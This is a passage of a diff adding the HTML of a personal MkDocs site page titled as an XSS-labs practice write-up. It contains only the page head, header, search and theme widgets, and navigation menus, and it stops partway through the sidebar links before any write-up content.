@@ -1,0 +1,4582 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Aniston的个人网站">
+      
+      
+        <meta name="author" content="Aniston">
+      
+      
+        <link rel="canonical" href="https://AnistonH.github.io/WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">
+      
+      
+        <link rel="prev" href="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">
+      
+      
+        <link rel="next" href="../Sqli-labs%E7%AC%94%E8%AE%B0/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.36">
+    
+    
+      
+        <title>Xss labs靶场打靶记录 - Aniston的个人网站</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.06209087.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.css">
+    
+      <link rel="stylesheet" href="../../../mkdocs/css/no-footer.css">
+    
+      <link rel="stylesheet" href="../../../mkdocs/css/unordered-list-symbols.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="orange">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#level-1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="Aniston的个人网站" class="md-header__button md-logo" aria-label="Aniston的个人网站" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Aniston的个人网站
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Xss labs靶场打靶记录
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="orange"  aria-label="切换至夜间模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换至夜间模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="orange"  aria-label="切换至日间模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换至日间模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/AnistonH/AnistonH.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    AnistonH.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../ME/" class="md-tabs__link">
+          
+  
+    
+  
+  我
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../DEC/" class="md-tabs__link">
+          
+  
+    
+  
+  开发
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+    
+  
+  网络安全
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../ESSAY/" class="md-tabs__link">
+          
+  
+    
+  
+  随笔
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../TimeLine/" class="md-tabs__link">
+          
+  
+    
+  
+  时间线
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../WEBSITE/" class="md-tabs__link">
+          
+  
+    
+  
+  网站
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Aniston的个人网站" class="md-nav__button md-logo" aria-label="Aniston的个人网站" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Aniston的个人网站
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/AnistonH/AnistonH.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    AnistonH.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../ME/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    我
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1" id="__nav_1_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            我
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/introduction/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人介绍
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/profile/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人信息
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/contact/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人联系方式
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/account/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人公众账号
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/experience/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    个人经历
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ME/support/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    打赏支持
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../DEC/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    开发
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            开发
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    数据结构
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            数据结构
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Alpha
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Alpha
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 单链表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 栈和队列
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 串、数组、广义表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 数和二叉树
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E5%9B%BE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 图
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 排序
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Alpha 查找
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    代码
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            代码
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    复杂度例题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    顺序表SeqList
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Triplets/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    三元组
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    单链表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%8D%95%E9%93%BE%E8%A1%A8-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E4%BA%8C/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    单链表-实验报告二
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    双向链表
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Grade%20Management%20System/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    成绩管理系统
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    栈和队列
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    循环队列
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/%E7%A8%80%E7%96%8F%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BD%AC%E7%BD%AE%E8%BF%90%E7%AE%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    稀疏矩阵的转置
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DEC/Data-Structure/Next%E6%95%B0%E7%BB%84-%E8%A7%82%E5%AF%9F%E6%B3%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Next数组-观察法
+  </span>
+  
+
